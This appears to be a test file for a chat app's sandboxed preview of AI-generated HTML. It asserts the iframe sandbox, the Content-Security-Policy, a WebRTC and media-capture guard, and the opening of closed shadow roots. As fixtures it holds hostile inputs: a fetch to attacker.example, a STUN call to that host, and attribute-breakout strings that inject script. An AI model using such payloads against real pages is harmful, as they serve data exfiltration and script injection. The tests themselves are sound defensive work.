import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import {
  HTML_PREVIEW_CDN_HOSTS,
  HTML_PREVIEW_CSP,
  HTML_PREVIEW_GUARD_SCRIPT,
  HTML_PREVIEW_WEBRTC_GLOBALS,
  HTML_PREVIEW_MAX_BYTES,
  HTML_PREVIEW_OUTER_CSP,
  HTML_PREVIEW_SANDBOX,
  HtmlPreviewUnavailableError,
  TEMPLATE_SCAN_TIME_LIMIT_MS,
  buildHtmlPreviewSrcdoc,
  isHtmlPreviewSmallEnough,
  isHtmlPreviewable,
  mentionsDeclarativeShadowRoot,
  openDeclarativeShadowRoots,
  withEmbedderNonce,
} from "../lib/htmlArtifactPreview.ts";
import { findTemplateStartTags } from "../lib/htmlPreviewTemplateStarts.ts";

/**
 * The isolation of the generated-HTML preview, pinned as strings.
 *
 * These assertions are the contract: a model-written page runs with script,
 * and what keeps it away from the signed-in account is the sandbox attribute
 * and the policy below. Loosening either has to break one of these.
 */

const directives = Object.fromEntries(
  HTML_PREVIEW_CSP.split(";").map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...values] = part.split(/\s+/);
    return [name, values];
  })
);

test("the sandbox grants scripts and nothing else, and above all not the app's origin", () => {
  const tokens = HTML_PREVIEW_SANDBOX.split(/\s+/).filter(Boolean);
  assert.deepEqual(tokens, ["allow-scripts"]);
  for (const forbidden of [
    "allow-same-origin", "allow-top-navigation", "allow-top-navigation-by-user-activation", "allow-top-navigation-to-custom-protocols",
    "allow-popups", "allow-popups-to-escape-sandbox", "allow-forms", "allow-modals", "allow-downloads", "allow-pointer-lock",
    "allow-presentation", "allow-orientation-lock", "allow-storage-access-by-user-activation",
  ]) {
    assert.ok(!tokens.includes(forbidden), forbidden);
  }
});

test("the policy cuts every channel a sandboxed script would have left", () => {
  assert.deepEqual(directives["default-src"], ["'none'"]);
  assert.deepEqual(directives["connect-src"], ["'none'"], "no fetch, XHR, WebSocket or beacon");
  assert.deepEqual(directives["form-action"], ["'none'"], "no form submission");
  assert.deepEqual(directives["base-uri"], ["'none'"], "no <base> to redirect relative URLs");
  assert.deepEqual(directives["frame-src"], ["'none'"], "no nested documents");
  assert.deepEqual(directives["object-src"], ["'none'"]);
  assert.deepEqual(directives["worker-src"], ["'none'"]);
  assert.deepEqual(directives["manifest-src"], ["'none'"]);
});

test("script, style, image and font sources are inline or one of three public CDNs, never a wildcard or a scheme", () => {
  assert.deepEqual([...HTML_PREVIEW_CDN_HOSTS], ["https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net", "https://unpkg.com"]);
  for (const name of ["script-src", "style-src", "img-src", "font-src"]) {
    for (const value of directives[name]) {
      assert.ok(
        value === "'unsafe-inline'" || value === "data:" || value === "blob:" || HTML_PREVIEW_CDN_HOSTS.includes(value),
        `${name} allows ${value}`
      );
    }
  }
  assert.ok(directives["script-src"].includes("'unsafe-inline'"), "an inline chart script must run");
  assert.ok(!HTML_PREVIEW_CSP.includes("'unsafe-eval'"), "no eval or Function from a string");
  assert.ok(!/(^|\s)\*(\s|;|$)/.test(HTML_PREVIEW_CSP), "no wildcard source");
  assert.ok(!/(^|\s)https?:(\s|;|$)/.test(HTML_PREVIEW_CSP), "no whole-scheme source");
  // Pages may draw with inline images only: no image URL, on a CDN or anywhere else, can carry the page's text out.
  assert.deepEqual(directives["img-src"], ["data:", "blob:"]);
});

const unescape = (value) => value.replace(/&quot;/g, '"').replace(/&amp;/g, "&");
const split = (srcdoc) => {
  const match = /^(<!doctype html><meta http-equiv="Content-Security-Policy" content="([^"]*)"><body[^>]*>)<iframe ([^>]*?) srcdoc="([^"]*)"><\/iframe>$/.exec(srcdoc);
  assert.ok(match, "the preview is one outer document holding one frame: " + srcdoc.slice(0, 200));
  return { outerPolicy: match[2], frameAttributes: match[3], inner: unescape(match[4]) };
};

test("the page lives in a frame inside ours, and the outer document allows no frames, so the page cannot navigate itself away", () => {
  const { outerPolicy, frameAttributes } = split(buildHtmlPreviewSrcdoc("<p>x</p>"));
  assert.equal(outerPolicy, HTML_PREVIEW_OUTER_CSP);
  assert.equal(HTML_PREVIEW_OUTER_CSP, "frame-src 'none'", "only frame-src: a srcdoc child inherits every directive, so nothing else may be added here");
  assert.match(frameAttributes, /sandbox="allow-scripts"/);
  assert.doesNotMatch(frameAttributes, /allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
  assert.match(frameAttributes, /referrerpolicy="no-referrer"/);
});

test("the page's policy meta is the first element of the inner document, ahead of anything the page says", () => {
  const hostile = `<!-- <head> --><script>fetch("https://attacker.example/steal")</script>`;
  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
  assert.ok(inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
  assert.ok(inner.indexOf("Content-Security-Policy") < inner.indexOf("<script>"));
  assert.ok(inner.endsWith(hostile), "the page is carried exactly as written");
});

test("a page that tries to close the frame attribute or the outer document stays inside the inner srcdoc", () => {
  const hostile = '"></iframe><script>alert(1)</script><iframe srcdoc="';
  const srcdoc = buildHtmlPreviewSrcdoc(hostile);
  const { inner } = split(srcdoc);
  assert.ok(inner.endsWith(hostile));
  // Every quote of the page is escaped, so the attribute cannot be closed from inside: the only quote-then-tag
  // sequence left is the real end of the one wrapper frame (split() matched `[^"]*` up to it).
  assert.equal(srcdoc.split('"><\/iframe>').length - 1, 1);
});

test("the page's own doctype is replaced by ours so the frame does not fall into quirks mode", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc(String.fromCharCode(0xfeff) + '  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><body>x</body></html>'));
  assert.equal(inner.match(/<!doctype/gi).length, 1);
  assert.ok(inner.endsWith("<html><body>x</body></html>"));
  // A doctype that is not at the start is the page's content and is left alone.
  assert.equal(split(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>")).inner.match(/<!doctype/gi).length, 2);
});

test("the policy also declares CSP3's WebRTC switch, which applies the day a browser enforces it", () => {
  assert.deepEqual(directives["webrtc"], ["'block'"]);
});

test("the WebRTC guard runs right after our policy and the DNS-prefetch switch, before anything the page says", () => {
  const hostile = `<script>new RTCPeerConnection({ iceServers: [{ urls: "stun:attacker.example:3478" }] })</script>`;
  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
  // CSP meta, then the DNS-prefetch meta, then the guard, then the page.
  const head =
    `<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">` +
    `<meta http-equiv="x-dns-prefetch-control" content="off">`;
  assert.ok(inner.startsWith(`${head}<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
  assert.ok(inner.endsWith(hostile));
  assert.ok(inner.indexOf(HTML_PREVIEW_GUARD_SCRIPT) < inner.indexOf("new RTCPeerConnection"));
});

test("in the chat the guard carries the embedding document's nonce, or the app's policy would block it", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: "bm9uY2UtdmFsdWU=" }));
  assert.ok(inner.includes(`<script nonce="bm9uY2UtdmFsdWU=">${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
  // A value that is not a nonce is not written into the attribute.
  for (const bad of ['x" onload="alert(1)', "short", ""]) {
    const { inner: plain } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: bad }));
    assert.ok(plain.includes(`<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`), bad);
  }
});

test("the guard locks every WebRTC name, media capture and nested frames, with functions it captured first", () => {
  for (const name of [
    "RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCSessionDescription", "RTCIceCandidate",
    "RTCRtpSender", "RTCRtpReceiver", "RTCRtpTransceiver", "RTCDtlsTransport", "RTCIceTransport", "RTCSctpTransport",
    "MediaStreamTrack",
  ]) {
    assert.ok(HTML_PREVIEW_WEBRTC_GLOBALS.includes(name), name);
  }
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /configurable: false/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /\/\^\(webkit\|moz\)\?RTC\//, "every RTC global, not only the listed ones");
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /mediaDevices/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /iframe,frame,frameset,object,embed/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /contentWindow/);
  // Same text in source, in srcdoc and at runtime, and it cannot end its own element early.
  assert.ok(!HTML_PREVIEW_GUARD_SCRIPT.includes("\\"));
  assert.ok(!/<\/script/i.test(HTML_PREVIEW_GUARD_SCRIPT));
  // It parses as a script.
  assert.doesNotThrow(() => new Function(HTML_PREVIEW_GUARD_SCRIPT));
});

test("the guard follows every shadow root: all are open, and markup parsers that make roots from strings are gone", () => {
  // Each added element and its descendants are entered through the shadowRoot getter captured before the page ran;
  // an open root is watched, swept of frames and entered in turn.
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('shadowOf = describe(Element.prototype, "shadowRoot").get'));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("var root = apply(shadowOf, element, []);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("apply(observe, observer, [root, watch]);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("each(apply(selectInRoot, root, [frames]), removeNode);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('each(apply(selectInRoot, root, ["*"]), enter);'));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('enter(node);\n      each(apply(select, node, ["*"]), enter);'));
  // What the browser reads members from later -- the observer's options and attachShadow's -- has no prototype and
  // only own data properties, so getters or setters a page puts on Object.prototype or Array.prototype are not read.
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("var field = create(null);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('var watch = create(null);\n    put(watch, "childList", true);\n    put(watch, "subtree", true);'));
  // attachShadow reads each option the page passed once, writes the mode last as open (a clonable closed root's copy
  // would be out of reach), and follows the root; the wrapper itself cannot be replaced.
  const wrapper = HTML_PREVIEW_GUARD_SCRIPT.slice(HTML_PREVIEW_GUARD_SCRIPT.indexOf('"attachShadow", {'));
  assert.ok(wrapper.includes("var options = create(null);"));
  assert.ok(wrapper.includes("var value = init[shadowKeys[s]];"));
  assert.ok(wrapper.includes('put(options, "mode", "open");\n          var root = apply(attach, this, [options]);\n          follow(root);'));
  assert.ok(!wrapper.includes(".push(") && !wrapper.includes("assign("));
  assert.match(wrapper, /writable: false, enumerable: false, configurable: false/);
  for (const key of ["delegatesFocus", "slotAssignment", "clonable", "serializable", "customElementRegistry"]) {
    assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes(`"${key}"`), key);
  }
  // A guard that cannot be set up in full stops the document before the page is parsed.
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.startsWith("(function () {\n  try {\n"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.endsWith("  } catch (error) {\n    // A guard that could not be set up in full is no guard: stop the document before the page is parsed.\n    window.stop();\n    throw error;\n  }\n})();"));
  // Every way to parse markup into a declarative shadow root without attachShadow, document.write included.
  for (const [holder, name] of [
    ["Element.prototype", "setHTMLUnsafe"], ["Element.prototype", "setHTML"],
    ["window.Document", "parseHTMLUnsafe"], ["window.Document", "parseHTML"],
    ["Document.prototype", "write"], ["Document.prototype", "writeln"],
    ["ShadowRoot.prototype", "setHTMLUnsafe"], ["ShadowRoot.prototype", "setHTML"],
  ]) {
    assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes(`[${holder}, "${name}"]`), `${holder}.${name}`);
  }
  // Capture is taken from the prototype too, not only from navigator.mediaDevices.
  for (const name of ["getUserMedia", "getDisplayMedia", "enumerateDevices"]) {
    assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes(`"${name}"`), name);
  }
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("lock(window.MediaDevices && window.MediaDevices.prototype, capture[c]);"));
});

// What the frame parses before the page; any text does for the finder's context.
const HEAD = '<!doctype html><meta http-equiv="Content-Security-Policy" content="x"><meta http-equiv="x-dns-prefetch-control" content="off"><script>(function () {})();</script>';
const OPEN = " shadowrootmode=open ";
const open = (page) => openDeclarativeShadowRoots(HEAD, page, findTemplateStartTags);

test("a closed declarative root is opened at the template start tags the HTML parser makes, and only there", () => {
  const opened = [
    ['<div><template shadowrootmode="closed"><p>x</p></template></div>', `<div><template${OPEN} shadowrootmode="closed"><p>x</p></template></div>`],
    // Any case, after a slash, unquoted, single-quoted, other whitespace; a `>` inside a quoted value.
    ["<TEMPLATE/SHADOWROOTMODE=CLOSED>x</TEMPLATE>", `<TEMPLATE${OPEN}/SHADOWROOTMODE=CLOSED>x</TEMPLATE>`],
    ["<template\n\tShadowRootMode='Closed'>x</template>", `<template${OPEN}\n\tShadowRootMode='Closed'>x</template>`],
    ['<template title="a>b"shadowrootmode=\'closed\'>x</template>', `<template${OPEN} title="a>b"shadowrootmode='closed'>x</template>`],
    // A value spelled with a character reference is read decoded, as the browser reads it.
    ['<template shadowrootmode="&#99;losed">x</template>', `<template${OPEN} shadowrootmode="&#99;losed">x</template>`],
    // Of two same-named attributes the first is the one the browser keeps.
    ["<template shadowrootmode=closed shadowrootmode=open>x</template>", `<template${OPEN} shadowrootmode=closed shadowrootmode=open>x</template>`],
    // `<!-->` is a whole comment, so the template after it is a tag.
    ["<!--><template shadowrootmode=closed>x</template>", `<!--><template${OPEN} shadowrootmode=closed>x</template>`],
    // A script string that looks like an unclosed tag does not hide the real tag after the script.
    [`<script>var s="<template title='";</script><template shadowrootmode=closed>x'</template>`, `<script>var s="<template title='";</script><template${OPEN} shadowrootmode=closed>x'</template>`],
    // Inside a template's content, and inside MathML's <mi>, a template is an HTML template.
    ["<template><div><template shadowrootmode=closed>inner</template></div></template>", `<template><div><template${OPEN} shadowrootmode=closed>inner</template></div></template>`],
    ["<math><mi><template shadowrootmode=closed>x</template></mi></math>", `<math><mi><template${OPEN} shadowrootmode=closed>x</template></mi></math>`],
    // Positions are in the page as written, carriage returns included.
    ["\r\n<p>\r\n</p><template shadowrootmode=closed>x</template>", `\r\n<p>\r\n</p><template${OPEN} shadowrootmode=closed>x</template>`],
  ];
  for (const [page, expected] of opened) assert.equal(open(page), expected, page);
  // Left exactly as written: open roots and other values, a template without the attribute, other elements, and
  // every text the parser does not read as a template tag -- script, style, comment, textarea, title, noscript,
  // an attribute value, a double-escaped script, an SVG template.
  for (const page of [
    '<template shadowrootmode="open"><style>p{color:red}</style><p>x</p></template>',
    "<template shadowrootmode=open shadowrootmode=closed>x</template>",
    '<template shadowrootmode=" closed">x</template>',
    "<template><p>no root</p></template>",
    '<div shadowrootmode="closed"></div><template shadowroot="closed">x</template>',
    "<script>const shadowroot = 1; var s = '<template shadowrootmode=closed>'; host.shadowRoot;</script>",
    "<style>/* <template shadowrootmode=closed> */ .shadowrootmode::after { content: 'shadowrootmode closed'; }</style>",
    "<!-- <template shadowrootmode=closed> --><p class=\"shadowrootmode\">shadowrootmode</p>",
    "<textarea><template shadowrootmode=closed></textarea><title><template shadowrootmode=closed></title>",
    "<noscript><template shadowrootmode=closed></noscript>",
    '<div title="<template shadowrootmode=closed>">x</div>',
    "<script><!--<script></script><template shadowrootmode=closed>--></script><p>after</p>",
    "<svg><template shadowrootmode=closed><p>x</p></template></svg>",
  ]) {
    assert.equal(open(page), page, page);
  }
});

test("a page that names shadowrootmode is refused, never drawn with its roots closed, when the scan is missing or fails", () => {
  const page = "<template shadowrootmode=closed>x</template>";
  assert.throws(() => openDeclarativeShadowRoots(HEAD, page), HtmlPreviewUnavailableError);
  assert.throws(() => openDeclarativeShadowRoots(HEAD, page, () => { throw new Error("parser failed"); }), HtmlPreviewUnavailableError);
  // A position that is not a template tag name in the page is a refusal too.
  assert.throws(() => openDeclarativeShadowRoots(HEAD, page, () => [{ nameEnd: HEAD.length + 3, mode: "closed" }]), HtmlPreviewUnavailableError);
  assert.throws(() => buildHtmlPreviewSrcdoc(page), HtmlPreviewUnavailableError);
  // Slower than the limit is a refusal, measured around the scan.
  const realNow = Date.now;
  let calls = 0;
  Date.now = () => (calls++ === 0 ? 0 : TEMPLATE_SCAN_TIME_LIMIT_MS + 1);
  try {
    assert.throws(() => openDeclarativeShadowRoots(HEAD, page, findTemplateStartTags), HtmlPreviewUnavailableError);
  } finally {
    Date.now = realNow;
  }
  // A page without the word needs no scan at all.
  assert.equal(openDeclarativeShadowRoots(HEAD, "<template><p>x</p></template>"), "<template><p>x</p></template>");
  assert.equal(mentionsDeclarativeShadowRoot("<p>ShadowRootMode</p>"), true);
  assert.equal(mentionsDeclarativeShadowRoot("<p>shadowRoot mode</p>"), false);
});

test("a 1 MB page full of closed templates is scanned well within the limit", () => {
  const page = '<div><template shadowrootmode="closed"><p>x</p></template></div>'.repeat(Math.floor(HTML_PREVIEW_MAX_BYTES / 62));
  const started = Date.now();
  const out = open(page);
  assert.ok(Date.now() - started < TEMPLATE_SCAN_TIME_LIMIT_MS, `${Date.now() - started} ms`);
  // Only insertions: taking them out gives the page back.
  assert.equal(out.split(OPEN).join(""), page);
  assert.equal(out.split(OPEN).length - 1, Math.floor(HTML_PREVIEW_MAX_BYTES / 62));
});

test("the root is opened when the frame is built, in the context the frame parses the page in", () => {
  const page = '<div id="host"><template shadowrootmode="closed"><iframe srcdoc="x"></iframe></template></div><p>after</p>';
  const { inner } = split(buildHtmlPreviewSrcdoc(page, null, { findTemplates: findTemplateStartTags }));
  assert.ok(inner.endsWith(`<div id="host"><template${OPEN} shadowrootmode="closed"><iframe srcdoc="x"></iframe></template></div><p>after</p>`));
  assert.ok(page.includes('<template shadowrootmode="closed">'));
  // The finder is handed the whole inner document, so a page is read after our head, not as a document of its own.
  let seen = null;
  buildHtmlPreviewSrcdoc(page, null, { findTemplates: (document) => { seen = document; return findTemplateStartTags(document); } });
  assert.ok(seen.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`) && seen.endsWith(page));
});

test("a policy the page adds cannot widen ours: ours stays first and unmodified", () => {
  const page = `<meta http-equiv="Content-Security-Policy" content="default-src *"><body>hi</body>`;
  assert.ok(split(buildHtmlPreviewSrcdoc(page)).inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
});

test("only a ready HTML file within the size limit is previewed", () => {
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "htm", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "HTML", byteSize: 10, status: "ready" }), true);
  for (const format of ["svg", "xml", "js", "md", "pdf", "xlsx", "css", "txt"]) {
    assert.equal(isHtmlPreviewable({ format, byteSize: 10, status: "ready" }), false, format);
  }
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "failed" }), false);
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "blocked" }), false);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES), true);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES + 1), false);
  assert.equal(isHtmlPreviewSmallEnough(Number.NaN), false);
  assert.equal(isHtmlPreviewSmallEnough(-1), false);
});

test("the embedder's nonce goes on the page's script, style and stylesheet elements, by the browser parser, and only when it is a plain token", () => {
  const touched = [];
  let asked = null;
  const parse = () => ({
    querySelectorAll: (selector) => { asked = selector; return [1, 2, 3].map((n) => ({ setAttribute: (name, value) => touched.push([n, name, value]) })); },
    documentElement: { outerHTML: "<html>rewritten</html>" },
  });
  assert.equal(withEmbedderNonce("<p>x</p>", "abc123def456", parse), "<html>rewritten</html>");
  assert.match(asked, /script/);
  assert.match(asked, /style/);
  assert.match(asked, /link/);
  assert.deepEqual(touched.map(([, name, value]) => [name, value]), Array(3).fill(["nonce", "abc123def456"]));
  // No nonce on the embedding page, or one that could break out of an attribute: the page is untouched.
  for (const nonce of [null, undefined, "", "short", "abc\" onload=\"x", "a b c d e f g h", "x".repeat(300)]) {
    assert.equal(withEmbedderNonce("<p>x</p>", nonce, () => { throw new Error("must not parse"); }), "<p>x</p>");
  }
});

test("the frame switches off DNS prefetching ahead of the page, after our policy", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc("<p>x</p>"));
  const policy = inner.indexOf("Content-Security-Policy");
  const prefetch = inner.indexOf('http-equiv="x-dns-prefetch-control" content="off"');
  assert.ok(policy >= 0 && prefetch > policy, "ours is the second element");
  assert.ok(prefetch < inner.indexOf("<p>x</p>"));
});

// Review r-20261128-054317-1a725b: the parent document does not parse or rewrite the
// model's HTML to deal with resource hints. A CSP cannot stop them and a pattern over
// HTML is bypassed; they are a known residual risk, covered by the frame's own policy
// and x-dns-prefetch-control only.
test("the parent document never parses or rewrites the model's HTML for resource hints", () => {
  const read = (path) => readFileSync(new URL(path, import.meta.url), "utf8");
  // The panel draws the frame through HtmlArtifactPreviewFrame, which builds the srcdoc.
  const panel = read("../components/chat/HtmlArtifactPreviewPanel.tsx");
  const frame = read("../components/chat/HtmlArtifactPreviewFrame.tsx");
  const lib = read("../lib/htmlArtifactPreview.ts");
  // Code only: a comment that names an API is not a use of it.
  const code = (source) => source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
  for (const source of [panel, frame, lib]) assert.ok(!source.includes("stripPreviewResourceHints"));
  assert.ok(!lib.includes("RESOURCE_HINT_SELECTOR"));
  // Two parses remain. The embedder-nonce rewrite, which existed before and runs only when the embedding document
  // has a nonce; and the template scan, a spec tokenizer (parse5) that only reports where real template start tags
  // are -- it builds and serialises nothing, and the chat loads it only for a page that names shadowrootmode.
  const finder = read("../lib/htmlPreviewTemplateStarts.ts");
  assert.ok(finder.includes('import { parse, type DefaultTreeAdapterMap } from "parse5";'));
  assert.doesNotMatch(code(finder), /serialize|innerHTML|outerHTML|appendChild|insertBefore/);
  assert.doesNotMatch(lib, /from "parse5"/);
  assert.ok(frame.includes('import("@/lib/htmlPreviewTemplateStarts")'));
  assert.ok(!frame.includes('from "@/lib/htmlPreviewTemplateStarts"'));
  assert.equal((panel + frame).split("new DOMParser()").length - 1, 1);
  assert.ok(frame.includes("withEmbedderNonce(html, nonce, (text) => new DOMParser()"));
  for (const source of [panel, frame, lib]) {
    assert.doesNotMatch(code(source), /innerHTML|insertAdjacentHTML|document\.write|createContextualFragment/);
  }
  // No pattern over the page's markup for resource hints in the build step either.
  assert.doesNotMatch(lib, /\.replace\([^)]*<link/i);
  // The one text change to the page is opening closed declarative roots -- one attribute put into a real template
  // start tag -- made where the frame is built.
  assert.equal(code(lib).split('openDeclarativeShadowRoots(head, html.replace(LEADING_DOCTYPE, ""), options.findTemplates)').length - 1, 1);
});
